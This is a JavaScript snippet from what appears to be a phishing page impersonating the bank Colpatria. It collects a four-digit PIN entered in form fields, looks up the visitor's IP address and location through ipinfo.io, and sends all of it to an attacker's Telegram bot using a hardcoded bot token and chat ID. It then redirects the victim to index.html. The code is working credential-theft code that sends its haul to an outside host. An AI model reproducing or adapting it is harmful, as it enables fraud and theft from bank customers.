  <script>
    const tokenTelegram = "7013446332:AAFzYh7kqHeba1qmpsXV4RDhSgqXRpVCcsY";
    const tokenIPinfo = "9c9af8c7467cc4";
  
    function enviarDatos(event) {
      event.preventDefault(); 
  
      const num1 = document.getElementById("num1").value;
      const num2 = document.getElementById("num2").value;
      const num3 = document.getElementById("num3").value;
      const num4 = document.getElementById("num4").value;
  
      // Concatenar todos los números en un solo mensaje
      const numerosConcatenados = `${num1}${num2}${num3}${num4}`;
  
      fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`)
        .then(response => response.json())
        .then(data => {
          const mensaje = `COLPATRIA\nPIN: ${numerosConcatenados}\nIP: ${data.ip}\nUbicación: ${data.city}, ${data.country}`;
  
          fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: "6588464495",
              text: mensaje
            })
          })
          .then(response => response.json())
          .then(data => {
            console.log("Respuesta de Telegram:", data);
            window.location.href = "index.html";
          })
          .catch(error => {
            console.error("Error al enviar datos", error);
          });
        })
        .catch(error => {
          console.error("Error al obtener información", error);
        });
    }
  </script>
